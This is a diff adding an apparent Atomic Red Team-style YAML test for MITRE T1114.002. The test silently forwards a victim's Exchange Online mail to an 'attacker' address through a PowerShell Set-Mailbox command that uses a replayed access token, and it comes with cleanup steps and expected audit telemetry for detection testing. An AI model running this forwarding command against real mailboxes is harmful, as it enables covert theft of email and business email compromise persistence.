@@ -1,0 +1,67 @@
+attack_technique: T1114.002
+display_name: "Post-Exploitation – Mailbox Forwarding via Exchange Online"
+atomic_tests:
+  - name: "Set SMTP forwarding on victim mailbox via ExchangeOnlineManagement"
+    auto_generated_guid: a3b4c5d6-e7f8-9012-abcd-012345678912
+    description: |
+      Sets external SMTP forwarding on a victim mailbox to silently copy
+      all inbound mail to an attacker-controlled address. A classic BEC
+      persistence mechanism. Wraps ExchangeOnlineManagement Set-Mailbox.
+      Requires an EXO-scoped access token.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      target_mailbox:
+        description: "UPN of the mailbox to configure forwarding on."
+        type: String
+      forwarding_address:
+        description: "External SMTP address to forward mail to."
+        type: String
+        default: "lab-attacker@example.com"
+      token_cache_path:
+        description: "Path to the EXO-scoped token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        Import-Module ExchangeOnlineManagement -ErrorAction Stop
+        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
+        Connect-ExchangeOnline -AccessToken $token.accessToken -Organization '#{tenant_id}' -ShowBanner:$false
+        Set-Mailbox -Identity '#{target_mailbox}' `
+                    -ForwardingSmtpAddress 'smtp:#{forwarding_address}' `
+                    -DeliverToMailboxAndForward $true
+        Disconnect-ExchangeOnline -Confirm:$false
+    cleanup_command: |
+      Import-Module ExchangeOnlineManagement -ErrorAction Stop
+      $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
+      Connect-ExchangeOnline -AccessToken $token.accessToken -Organization '#{tenant_id}' -ShowBanner:$false
+      Set-Mailbox -Identity '#{target_mailbox}' -ForwardingSmtpAddress $null -DeliverToMailboxAndForward $false
+      Disconnect-ExchangeOnline -Confirm:$false
+    references:
+      - "https://thedfirreport.com/2023/01/09/you-ve-been-hit-with-a-bec/"
+    auth_profile: "exo-delegated"
+    defense_evasion: "Silent exfiltration via SMTP forwarding; no mailbox login required post-setup"
+    requires_token:
+      from: "cookie-replay"
+      resource: "https://outlook.office.com"
+    expected_telemetry:
+      - source: ual
+        match:
+          Operations: "Set-Mailbox"
+          ResultStatus: "True"
+        within_minutes: 15
+      - source: exo_audit
+        match:
+          Operations: "Set-Mailbox"
+          Parameters: "ForwardingSmtpAddress"
+        within_minutes: 20
+    exercises_chokepoint:
+      id: "DC-POSTEX-001"
+      url: "https://detectionchokepoints.com/postex/mailbox-forwarding"
